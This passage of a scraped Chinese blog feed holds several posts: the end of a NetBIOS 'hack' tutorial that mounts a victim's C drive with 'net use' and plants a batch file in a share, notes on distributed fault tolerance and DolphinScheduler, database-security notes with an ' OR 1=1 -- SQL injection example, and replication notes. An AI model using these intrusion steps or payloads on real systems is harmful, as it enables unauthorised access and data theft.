class="line">---------------------------------------             </span><br><span class="line">如果您在 NetBIOS 远程机器名称表中看到这个</span><br><span class="line">---------------------------------------</span><br><span class="line">\名称 类型 状态 —————————————————————</span><br><span class="line">user&lt;00&gt; UNIQUE 注册</span><br><span class="line">工作组 &lt;00&gt; GROUP 注册</span><br><span class="line">用户 &lt;03&gt; UNIQUE 注册</span><br><span class="line">用户 &lt;20&gt; UNIQUE 注册</span><br><span class="line">----------------------------------</span><br><span class="line">MAC地址= xx-xx-xx-xx-xx-xx</span><br><span class="line">—————————————————————</span><br><span class="line">如果你没有得到数字&lt;20&gt;。</span><br><span class="line">受害者禁用了文件和打印机共享，找到另一个受害者。</span><br></pre></td></tr></table></figure><ul><li>第 4 步：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;</span><br><span class="line">现在键入“net use x:\IPaddressOfVictimCDISK”，然后按 Enter&gt;</span><br><span class="line">---------------------------------------------------------</span><br><span class="line">用 vitim 的 IP 地址代替“IPaddressOfVictim.</span><br><span class="line">---------------------------------------------------------</span><br><span class="line">你可以用任何字母代替“x”。</span><br><span class="line">---------------------------------------------------------</span><br><span class="line">例如：</span><br><span class="line">             net use x:\223.222.222.222CDISK</span><br></pre></td></tr></table></figure><ul><li>第 5 步：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">现在打开 Windows 资源管理器或双击</span><br><span class="line">桌面上的“我的电脑”图标，您将看到一个新的网络驱动器</span><br><span class="line">---------------------------------------------</span><br><span class="line">现在打开 Windows 资源管理器或双击</span><br><span class="line">桌面上的“我的电脑”图标，您将看到一个新的网络驱动器 X:</span><br><span class="line">---------------------------------------------</span><br><span class="line">仅当您的网络上有某人的 ip 时，此 hack 才会起作用。如果您要“破解”的人的 ip 不在您的网络上，它将无法正常工作。</span><br><span class="line">--------------------------------------------------------------------------------------------------------</span><br><span class="line">如果您只能访问您的目标共享文件夹，则在他们的共享文件夹中放置一个批处理文件，如果他们打开它，使用命令 C=C，它将共享他们的硬盘。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>分布式系统 V3.0</title>
      <link href="/josyaaa/2022/05/12/fault-tolerance/"/>
      <url>/josyaaa/2022/05/12/fault-tolerance/</url>
      
        <content type="html"><![CDATA[<p>分布式系统区别于单机系统的特性是可以容许部分失效，这个故障也许会影响其他组件的正常操作。进程恢复涉及到的技术可以使一个或多个进程发生故障而不会严重影响到系统的其余部分。可靠多播与进程恢复相关，它确保可以成功地把信息传输到一个进程集合，要保持进程同步可靠多播通常是必需的。</p><h2 id="容错性概述"><a href="#容错性概述" class="headerlink" title="容错性概述"></a>容错性概述</h2><ul><li>what is dependable system ?</li></ul><p>可用性：高可用的系统在任何给定的时刻都能及时地工作<br>可靠性：系统可以无故障地持续运行<br>安全性：系统偶然出现故障的情况下能正确操作而不会造成任何灾难<br>可维护性：发生故障的系统被恢复的难易程度</p><ul><li>dependable system question ?</li></ul><p>防止、解决、预报故障，意味着系统即使在发生故障时还能提供服务</p><ul><li>what are the  fault types ?</li></ul><p>暂时故障(fault tolerance)<br>间歇故障(transient fault)<br>持久故障(permanent fault)</p><ul><li>failure model</li></ul><p>| 崩溃性故障 ｜ 遗漏性故障 ｜ 定时故障 ｜ 响应故障 ｜ 随意性故障 ｜<br>|———— | ———– | ——————— | ——————- | ————————— |</p><h2 id="服务器停机-服务器无法响应-服务器响应不再时间间隔内-服务器响应不正确-服务器可能在随意时间产生随意的响应"><a href="#服务器停机-服务器无法响应-服务器响应不再时间间隔内-服务器响应不正确-服务器可能在随意时间产生随意的响应" class="headerlink" title="| 服务器停机 | 服务器无法响应 | 服务器响应不再时间间隔内 | 服务器响应不正确 | 服务器可能在随意时间产生随意的响应 |"></a>| 服务器停机 | 服务器无法响应 | 服务器响应不再时间间隔内 | 服务器响应不正确 | 服务器可能在随意时间产生随意的响应 |</h2><p>崩溃性故障：操作系统崩溃  <em><strong><strong>重新启动</strong>_</strong></em><br>遗漏性故障：<br>1、缓冲区溢出而服务器又没有为这样的情况做好准备时就出现故障<br>2、可能由诸如无限循环或不正确的内存管理<br>定时故障：如果数据流速度过快，而在接收方又没有足够的缓冲空间来保存所到来的数据就容易在接收方引起问题<br>响应故障：<br>1、发生数值故障的情况下，服务器为请求提供错误的响应（例如搜索引擎返回了使用的搜索项无关的web页面）<br>2、服务器对到来的请求做出意想不到的响应时就发生这种情况<br>随意性故障：<br>1、拜占庭故障，服务器可能产生它从来没有产生过的输出，但又不能检测出结果<br>2、失败停机故障，因为可能发生被其他的进程探测到<br>3、安全失败故障，服务器通过程序遗漏性故障或崩溃性故障而停机，服务器最后可能产生随机的输出，但是这个输出简单地被其他进程识别为垃圾</p><ul><li>冗余掩盖故障</li></ul><p>信息冗余：添加额外的位可以使错乱的位恢复正常，hamming码来恢复传输线路上的噪声中恢复数据<br>时间冗余：执行一个动作，如果需要就再次执行，事务处理<br>物理冗余：添加往外的装备或进程使系统作为一个整体容忍部分组件的失效或故障成为可能 <em><strong><strong>三倍模块冗余 、TMR</strong>_</strong></em></p><h2 id="进程恢复"><a href="#进程恢复" class="headerlink" title="进程恢复"></a>进程恢复</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DolphinScheduler</title>
      <link href="/josyaaa/2022/05/12/design/"/>
      <url>/josyaaa/2022/05/12/design/</url>
      
        <content type="html"><![CDATA[<p>DolphinScheduler 是一个分布式易扩展、去中心化的可视化DAG工作流任务调度系统，以DAG流式的方式将Task组装起来，可实时监控任务的运行状态，同时支持执行重试、kill等任务。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;p align=&quot;center&quot;&gt;</span><br><span class="line">  &lt;img src=&quot;/img/architecture-1.3.0.jpg&quot; alt=&quot;系统架构图&quot;  width=&quot;70%&quot; /&gt;</span><br><span class="line">  &lt;p align=&quot;center&quot;&gt;</span><br><span class="line">        &lt;em&gt;系统架构图&lt;/em&gt;</span><br><span class="line">  &lt;/p&gt;</span><br><span class="line">&lt;/p&gt;</span><br></pre></td></tr></table></figure><h4 id="MasterServer"><a href="#MasterServer" class="headerlink" title="MasterServer"></a>MasterServer</h4><p>  MasterServer采用分布式无中心设计理念，MasterServer主要负责 DAG 任务切分、任务提交监控，并同时监听其它MasterServer和WorkerServer的健康状态。<br>  MasterServer服务启动时向Zookeeper注册临时节点，通过监听Zookeeper临时节点变化来进行容错处理。<br>  MasterServer基于netty提供监听服务。</p><p>  MasterServer由以下组件组成：</p><ul><li><strong>Distributed Quartz</strong>分布式调度组件，主要负责定时任务的启停操作，当quartz调起任务后，Master内部会有线程池具体负责处理任务的后续操作</li><li><strong>MasterSchedulerService</strong>是一个扫描线程，定时扫描数据库中的 <strong>command</strong> 表，生成工作流实例，根据不同的<strong>命令类型</strong>进行不同的业务操作</li><li><strong>WorkflowExecuteThread</strong>主要是负责DAG任务切分、任务提交、各种不同命令类型的逻辑处理，处理任务状态和工作流状态事件</li><li><strong>EventExecuteService</strong>处理master负责的工作流实例所有的状态变化事件，使用线程池处理工作流的状态事件</li><li><strong>StateWheelExecuteThread</strong>处理依赖任务和超时任务的定时状态更新</li></ul><h4 id="WorkerServer"><a href="#WorkerServer" class="headerlink" title="WorkerServer"></a>WorkerServer</h4><p>  WorkerServer也采用分布式无中心设计理念，支持自定义任务插件，主要负责任务的执行和提供日志服务。<br>  WorkerServer服务启动时向Zookeeper注册临时节点，并维持心跳。</p><p>  WorkerServer由以下组件组成：</p><ul><li><strong>WorkerManagerThread</strong>主要通过netty领取master发送过来的任务，并根据不同任务类型调用<strong>TaskExecuteThread</strong>对应执行器。</li><li><strong>RetryReportTaskStatusThread</strong>主要通过netty向master汇报任务状态，如果汇报失败，会一直重试汇报</li><li><strong>LoggerServer</strong>是一个日志服务，提供日志分片查看、刷新和下载等功能</li></ul><h4 id="Registry"><a href="#Registry" class="headerlink" title="Registry"></a>Registry</h4><p>  注册中心，使用插件化实现，默认支持Zookeeper, 系统中的MasterServer和WorkerServer节点通过注册中心来进行集群管理和容错。另外系统还基于注册中心进行事件监听和分布式锁。</p><h4 id="Alert"><a href="#Alert" class="headerlink" title="Alert"></a>Alert</h4><p>  提供告警相关功能，仅支持单机服务。支持自定义告警插件。</p><h4 id="API"><a href="#API" class="headerlink" title="API"></a>API</h4><p>  API接口层，主要负责处理前端UI层的请求。该服务统一提供RESTful api向外部提供请求服务。<br>  接口包括工作流的创建、定义、查询、修改、发布、下线、手工启动、停止、暂停、恢复、从该节点开始执行等等。</p><h4 id="UI"><a href="#UI" class="headerlink" title="UI"></a>UI</h4><p>  系统的前端页面，提供系统的各种可视化操作界面，详见<a href="../guide/homepage.md">功能介绍</a>部分。</p><h2 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h2><p>DolphinScheduler使用分片算法将command取模，根据master的排序id分配，master将拿到的command转换成工作流实例，使用线程池处理工作流实例。</p><p>DolphinScheduler对工作流的处理流程:</p><ul><li>通过UI或者API调用，启动工作流，持久化一条command到数据库中</li><li>Master通过分片算法，扫描Command表，生成工作流实例ProcessInstance，同时删除Command数据</li><li>Master使用线程池运行WorkflowExecuteThread，执行工作流实例的流程，包括构建DAG，创建任务实例TaskInstance，将TaskInstance通过netty发送给worker</li><li>Worker收到任务以后，修改任务状态，并将执行信息返回Master</li><li>Master收到任务信息，持久化到数据库，并且将状态变化事件存入EventExecuteService事件队列</li><li>EventExecuteService根据事件队列调用WorkflowExecuteThread进行后续任务的提交和工作流状态的修改</li></ul>  <p align="center">  <img src="/img/master-process-2.0-zh_cn.png" alt="Start process activity diagram"  width="70%" />  <p align="center">        <em>启动流程活动图</em>  </p></p><h2 id="容错设计"><a href="#容错设计" class="headerlink" title="容错设计"></a>容错设计</h2><p>容错分为<strong>服务宕机容错</strong>、<strong>任务重试</strong>，服务宕机容错由<strong>Master容错</strong>和<strong>Worker容错</strong>组成</p><h5 id="服务宕机容错"><a href="#服务宕机容错" class="headerlink" title="服务宕机容错"></a>服务宕机容错</h5><ul><li>Master容错：</li></ul><p align="center">   <img src="/img/failover-master.jpg" alt="容错流程"  width="50%" /> </p><p>容错范围：从host的维度来看，Master的容错范围包括：自身host+注册中心上不存在的节点host，容错的整个过程会加锁；</p><p>容错内容：Master容错工作流实例和任务实例，在容错前会比较实例的开始时间和服务节点的启动时间，在服务启动时间之后的则跳过容错；</p><p>容错后处理：ZooKeeper Master容错完成之后则重新由DolphinScheduler中Scheduler线程调度，遍历 DAG 找到”正在运行”和“提交成功”的任务，对”正在运行”的任务监控其任务实例的状态，对”提交成功”的任务需要判断Task Queue中是否已经存在，如果存在则同样监控任务实例的状态，如果不存在则重新提交任务实例。</p><ul><li>Worker容错：</li></ul><p align="center">   <img src="/img/failover-worker.jpg" alt="容错流程"  width="50%" /> </p><p>容错范围：从工作流实例的维度看，每个Master只负责容错自己的工作流实例；只有在<code>handleDeadServer</code>时会加锁；</p><p>容错内容：当发送Worker节点的remove事件时，Master只容错任务实例，在容错前会比较实例的开始时间和服务节点的启动时间，在服务启动时间之后的则跳过容错；</p><p>容错后处理：Master Scheduler线程一旦发现任务实例为” 需要容错”状态，则接管任务并进行重新提交。</p><p>注意：由于” 网络抖动”可能会使得节点短时间内失去和ZooKeeper的心跳，从而发生节点的remove事件。对于这种情况，我们使用最简单的方式，那就是节点一旦和ZooKeeper发生超时连接，则直接将Master或Worker服务停掉。</p><h5 id="任务重试"><a href="#任务重试" class="headerlink" title="任务重试"></a>任务重试</h5><p>DolphinScheduler 将工作流中的任务节点分为以下类型：</p><ul><li><p>业务节点，它对应一个实际的脚本或者处理语句，比如Shell节点，MR节点、Spark节点、依赖节点等。</p></li><li><p>逻辑节点，它不做实际的脚本或语句处理，只是整个流程流转的逻辑处理，比如子流程节等。</p></li></ul><p>所有任务都可以配置失败重试的次数，当该任务节点失败，会自动重试，直到成功或者超过配置的重试次数。如果工作流中有任务失败达到最大重试次数，工作流就会失败停止，失败的工作流可以手动进行重跑操作或者流程恢复操作</p><h2 id="任务优先级"><a href="#任务优先级" class="headerlink" title="任务优先级"></a>任务优先级</h2><p><strong>不同流程实例优先级</strong>&gt;<strong>同一个流程实例优先级</strong>&gt;<strong>同一流程内任务优先级</strong>&gt;<strong>同一流程内任务</strong>进行任务处理。<br>每个任务实例根据<strong>json</strong>解析优先级，将其信息保存在任务队列中。<br>任务队列获取的时候，通过字符串比较可得出需要优先执行的任务。</p><ul><li>流程定义优先级：HIGHEST、HIGH、MEDIUM、LOW、LOWEST。</li><li>任务优先级：HIGHEST、HIGH、MEDIUM、LOW、LOWEST。</li></ul><h2 id="日志访问"><a href="#日志访问" class="headerlink" title="日志访问"></a>日志访问</h2><p>Web(UI) 和 worker 可能不在同一机器，查询日志采取以下方案：</p><ul><li>存放于Elasticsearch</li><li>gRPC远程访问日志</li></ul><p> 我们使用自定义Logback的FileAppender和Filter功能，实现每个任务实例生成一个日志文件，同时以流程定义、流程实例、任务实例的形式生成日志过滤匹配TaskLogInfo开始的线程名称。</p><p>FileAppender：</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * task log appender</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TaskLogAppender</span> <span class="keyword">extends</span> <span class="title class_">FileAppender</span>&lt;ILoggingEvent&gt; &#123;</span><br><span class="line"></span><br><span class="line">     ...</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">append</span><span class="params">(ILoggingEvent event)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (currentlyActiveFile == <span class="literal">null</span>)&#123;</span><br><span class="line">            currentlyActiveFile = getFile();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">activeFile</span> <span class="operator">=</span> currentlyActiveFile;</span><br><span class="line">        <span class="comment">// thread name： taskThreadName-processDefineId_processInstanceId_taskInstanceId</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">threadName</span> <span class="operator">=</span> event.getThreadName();</span><br><span class="line">        String[] threadNameArr = threadName.split(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">        <span class="comment">// logId = processDefineId_processInstanceId_taskInstanceId</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">logId</span> <span class="operator">=</span> threadNameArr[<span class="number">1</span>];</span><br><span class="line">        ...</span><br><span class="line">        <span class="built_in">super</span>.subAppend(event);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TaskLogFilter：</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  task log filter</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TaskLogFilter</span> <span class="keyword">extends</span> <span class="title class_">Filter</span>&lt;ILoggingEvent&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> FilterReply <span class="title function_">decide</span><span class="params">(ILoggingEvent event)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (event.getThreadName().startsWith(<span class="string">&quot;TaskLogInfo-&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> FilterReply.ACCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> FilterReply.DENY;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>数据库逻辑</title>
      <link href="/josyaaa/2022/05/12/database-securty/"/>
      <url>/josyaaa/2022/05/12/database-securty/</url>
      
        <content type="html"><![CDATA[<p>检测、响应、事件响应</p><h3 id="事件响应过程"><a href="#事件响应过程" class="headerlink" title="事件响应过程"></a>事件响应过程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">A[system was working properly] --&gt; B[user open suspicious email] --&gt; C[sensors do not detect anything]</span><br><span class="line">C[sensors do not detect anything] --&gt; D[a user trying to authenticate from his mobile decvice reports that he is unable to aurhanticate] --&gt; E[help desk starts troublesing the issue] --&gt; F[since there are indications of compromise a security incident is created] --&gt; G[incident response continues from here]</span><br></pre></td></tr></table></figure><hr><table><thead><tr><th>日志</th><th>攻击&#x2F;操作</th></tr></thead><tbody><tr><td>端点保护和操作系统日志可以帮助确定 IOC</td><td>网络钓鱼电子邮件</td></tr><tr><td>端点保护和操作系统日志可以帮助确定 IOC</td><td>横向移动，然后特权升级</td></tr><tr><td>服务器日志和网络捕获可以帮助确定 IOC</td><td>未经授权或恶意进程可以进取或修改数据</td></tr><tr><td>假设云和本地资源之间有防火墙，防火墙日志和网络捕获可以帮助确定 IOC</td><td>数据提取和提交指挥和控制</td></tr></tbody></table><hr><table><thead><tr><th>主题</th></tr></thead><tbody><tr><td>监控系统与传感器集成，以便在单个仪表板中可视化所有事件</td></tr><tr><td>检测和监控系统集成，帮助将执行多个恶意行为的点链接起来，以实现最终任务，数据提取和提交给指挥和控制</td></tr><tr><td>检测和分析有时并行进行</td></tr></tbody></table><hr><ul><li>现代数据库管理复杂程度与用于保护安全技术不匹配</li><li>数据库成熟的交互协议，SQL语句存在弱点的基础上制定安全策略</li><li>组织或机构缺少丰富知识体系的数据库安全管理人员</li><li>企业环境存储多数据库平台和多操作系统的兼容性构成一个异构环境</li><li>企业部分或全部数据存储到云上</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">A[数据库实用程序] --&gt; B[DDL处理器] --&gt; d1[(数据库表述表)]</span><br><span class="line">d2[(授权表)] --&gt; C[DBMS 事物管理器 文件管理器]</span><br><span class="line">d3[(并发访问表)] --&gt; C</span><br><span class="line">C --&gt; d4[(物理数据库)]</span><br><span class="line">d1[(数据库表述表)] --&gt; C[DBMS 事物管理器 文件管理器]</span><br><span class="line">D[DML和查询处理语言器] --&gt; C[DBMS 事物管理器 文件管理器]</span><br><span class="line">d1[(数据库表述表)] --&gt; D[DML和查询处理语言器]</span><br><span class="line">E[用户应用] --&gt; D[DML和查询处理语言器]</span><br><span class="line">F[用户查询] --&gt; D[DML和查询处理语言器]</span><br></pre></td></tr></table></figure><blockquote><p>DDL&#x3D; 数据定义语言      DML&#x3D; 数据操作语言<br>授权表：用于确保用户具有执行数据库查询语句的权限<br>并发访问表：用于在同时执行冲突命令时避免产生冲突</p></blockquote><h3 id="Database-and-cloud-Managment-System-Security-mechanism"><a href="#Database-and-cloud-Managment-System-Security-mechanism" class="headerlink" title="Database and cloud Managment System Security mechanism"></a>Database and cloud Managment System Security mechanism</h3><ul><li>据库系统对于海量数据提供流高效的访问，这些需求超出了一般的基于OS的安全机制或独立的安全包所具有的能力</li><li>操作系统的安全机制一般控制对整个文件的读写访问，所以它可以用来控制收否允许用户读写某个文件（如人事文件）中的任何信息，但不能用来限制访问该文件中的具体记录或字段，然而DBMS却允许制定这种更精细的访问控制，它通常还能实现对更多命令施加访问控制，因此转为数据库系统设计并与其汇集成在一起的安全服务和安全机制是必须的。</li></ul><h3 id="SQLi"><a href="#SQLi" class="headerlink" title="SQLi"></a>SQLi</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">A[user] --&gt; B[internet] --&gt; d1[(route)] --&gt; d2[(firewall)] --&gt; d3[(switch)] --&gt; d4[wifi]</span><br><span class="line">d3[firewall] --&gt; f1&#123;Two way interaction link&#125;</span><br><span class="line">f1&#123;Two way interaction link&#125;  --&gt; |1| C1[web server]</span><br><span class="line">f1&#123;Two way interaction link&#125;  --&gt; |2| C2[web server]</span><br><span class="line">f1&#123;Two way interaction link&#125;  --&gt; |3| C3[web server]</span><br><span class="line">C1[web server] --&gt; D1[web application server]</span><br><span class="line">C2[web server] --&gt; D1[web application server]</span><br><span class="line">C3[web server] --&gt; D1[web application server]</span><br><span class="line">D1[web application server] --&gt; E1[Database server] --&gt; E2[Database]</span><br></pre></td></tr></table></figure><blockquote><p>SQLi attack:<br>1.攻击者找到web的脆弱点，通过向web服务器发送命令来对数据库注入SQL。这些命令注入到被防火墙接受的网络流量中<br>2.web服务接受到恶意代码，然后发送给web应用服务器<br>3.web应用服务器接收到web服务器的恶意代码后，将其发送给数据库服务器<br>4.数据库服务器在数据库执行恶意代码，数据库从信用卡表中返回数据<br>5.web应用服务器动态地生成一个包含数据库信用卡详细信息的页面<br>6.web服务器向攻击者发送信用卡详细信息</p></blockquote><h3 id="SQLi-attack"><a href="#SQLi-attack" class="headerlink" title="SQLi attack"></a>SQLi attack</h3><ul><li><p>用户输入<br>通过精心构造用户输入来注入SQL命令，web应用程序以多种方式读取用户输入，多数采用HTTP GET or POST 请求发送到 Web 应用程序的表单提交。</p></li><li><p>服务器变量<br>服务器变量包含是HTTP头部、网络协议头部、环境变量等数据变量集合。可以伪造 HTTP 和网络报头中的值，可以利用此漏洞将数据直接放入报头。</p></li><li><p>二阶注入<br>SQL 的预防机制不够完善，会出现二阶注入，在二阶注入中，恶意用户可以利用系统或数据库中已存在的数据来触发一个 SQL 注入攻击来自系统本身的。</p></li><li><p>cookie<br>cookie用来恢复用户客户端的状态信息，由于客户端可以控制 cookie 所以可更改 cookie 的内容来构建 SQL 查询时修改查询的结构和功能</p></li><li><p>物理用户输入<br>RFID、条形码、图像是被技术扫描等然后发送到数据库系统的纸质形式</p></li></ul><h3 id="SQLi-attack-pulic"><a href="#SQLi-attack-pulic" class="headerlink" title="SQLi attack pulic"></a>SQLi attack pulic</h3><ul><li>inferential(带内)</li></ul><ol><li>重言式是将代码注入一个或多个永真的条件表达式</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$query = &quot; SELECT info FROM user WHERE name = &#x27;$_GET[&quot;name&quot;]&#x27; AND pwd = &#x27;$_GET[&quot;pwd&quot;]&#x27;&quot;;</span><br><span class="line">SELECT info FROM users WHERE name = &#x27; &#x27; OR 1=1 -- AND pwpd = &#x27;&#x27;</span><br></pre></td></tr></table></figure><ol start="2"><li><p>行尾注释</p></li><li><p>捎带查询</p></li></ol><ul><li>out of band(推理)</li></ul><ol><li>非法&#x2F;逻辑错误查询（利用是应用服务器返回默认错误页面通常描述许多过多的细节内容）</li><li>盲SQL注入（允许攻击者推测数据库系统中的数据）</li></ol><ul><li>inband attack(带外)</li></ul><p>检索数据使用不同的通信信道</p><h3 id="SQLi-resoonse-measures"><a href="#SQLi-resoonse-measures" class="headerlink" title="SQLi resoonse measures"></a>SQLi resoonse measures</h3><ul><li>基于签名</li><li>基于异常</li><li>代码分析</li><li>运行阻断</li></ul><h3 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h3><p>sqlmap</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>分布式系统 V2.0s</title>
      <link href="/josyaaa/2022/05/12/copy/"/>
      <url>/josyaaa/2022/05/12/copy/</url>
      
        <content type="html"><![CDATA[<h1 id="一致性和复制"><a href="#一致性和复制" class="headerlink" title="一致性和复制"></a>一致性和复制</h1><p>对数据进行复制一般是为了增强系统的可靠性或提高性能，实现数据复制的主要难题是保持各个副本的一致性。</p><h1 id="如何真正实现一致性"><a href="#如何真正实现一致性" class="headerlink" title="如何真正实现一致性"></a>如何真正实现一致性</h1><ul><li>关注的是副本的管理，不仅仅考虑副本服务器的放置，同时需要考虑如何在这些服务器之间分发的</li><li>如何保持多个副本的一致性，在大多数情况下，应用程序都要求数据保持很强的一致性</li></ul><h2 id="复制作为一种实现可扩展性的技术"><a href="#复制作为一种实现可扩展性的技术" class="headerlink" title="复制作为一种实现可扩展性的技术"></a>复制作为一种实现可扩展性的技术</h2><ul><li>可靠性</li><li>性能（地理区域上的扩展也可能需要进行数据复制，如果在使用数据进程附近放置一份该数据的副本，那么进程访问数据所花费的时间将减少）</li></ul><h4 id="复制需要付出代价"><a href="#复制需要付出代价" class="headerlink" title="复制需要付出代价"></a>复制需要付出代价</h4><ul><li>进行数据复制是需要付出代价的，复制所带来的问题是多个副本可能导致一致性方面的问题，一旦某个副本被修改了，那么将不同于其他所有的副本</li></ul><h2 id="扩展性技术的复制"><a href="#扩展性技术的复制" class="headerlink" title="扩展性技术的复制"></a>扩展性技术的复制</h2><ul><li>可能要一个付出的代价是使副本保持为最新的数据要求更多的网络带宽</li><li>保持多个副本间一致性本身就可能存在严重的可扩展性问题（当多个副本总保持相同的时候，这些副本的集合是一致的）</li></ul><p><strong>副本可能需要使用Lamport时间戳来决定执行操作的全局顺序，或由一个协调器来分配这样的顺序，全局同步必然造成性能的下降，唯一的解决方案是“放宽在一致性上面的限制，也就是可以放松更新必须以原子操作的方式执行”，就可避免进行瞬间的全局同步</strong></p><h2 id="以数据中心的一致性模型（数据存储角度）"><a href="#以数据中心的一致性模型（数据存储角度）" class="headerlink" title="以数据中心的一致性模型（数据存储角度）"></a>以数据中心的一致性模型（数据存储角度）</h2><ul><li>一致性模型实质上是进程和数据存储之间的一个约定</li></ul><h4 id="持续一致性"><a href="#持续一致性" class="headerlink" title="持续一致性"></a>持续一致性</h4><ul><li>持续一致性“副本之间的数值偏差、副本之间新旧程度的偏差、更新操作顺序的偏差”</li><li>绝对值偏差或相对数值偏差，表示两个副本之间的差别不能超过多少</li><li>数值偏差是已应用给定副本但还没有应用于其他副本的更新数目</li></ul><h4 id="一致性单元"><a href="#一致性单元" class="headerlink" title="一致性单元"></a>一致性单元</h4><ul><li>需要一些协议</li><li>持续程序开发人员必须为他们应用程序指出一致性需求，可以持续一致性实现为一种工具包（函数库）</li></ul><h4 id="一致性操作顺序"><a href="#一致性操作顺序" class="headerlink" title="一致性操作顺序"></a>一致性操作顺序</h4><p>“顺序一致性、因果一致性”是在读写操作层面上定义的（最初模型是为了共享内存的多处理器系统开发，在硬件层上真正实现的）</p><p><strong>顺序一致性</strong></p><p>任何执行结果都是相同的，就好像所有进程对数据存储的读、写操作是按某种序列顺序执行的，并且每个进程的操作按照程序所制定的顺序出现在这个序列中（也就是说当进程在多台可能不同机器上并发运行时，任何读、写操作的有效交叉是可以接收的行为，但是所有进程都看到相同的操作交叉），如果出现其中任何一种结果，进程都必须正常地运行。</p><p><strong>因果一致性</strong></p><p> 表示一种弱化的顺序一致性模型，因为因果一致性将具有潜在因果关系的事件和没有因果关系的事件区分开来（无因果关系的操作称为并发），“如果数据库属于因果一致，必须符合所有进程必须以相同的顺序看到具有潜在因果关系的写操作，不同机器上可以以不同的顺序看到并发写的操作”</p><p>实现因果一致性要求跟踪那些进程看到那些写操作，这意味着必须构建和维护一张记录那些操作与其他操作有关的关系图 <em><strong>向量时间戳 和 向量时间戳捕获因果关系</strong></em></p><p><strong>分组操作</strong></p><p>共享数据的程序之间的并发性往往是通过互斥和事物的同步化机制来控制（ENTRT_CS的进程确保在它的本地存储中的数据是最新的，LEVEL_CS封装起来）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在进程对被保护的共享数据的所有更新操作执行完之前，不允许另一个进程执行对同步化变量的获取访问</span><br><span class="line">（当一个进程获得拥有权后，这种拥有权直到所有被保护的数据均被更新）</span><br><span 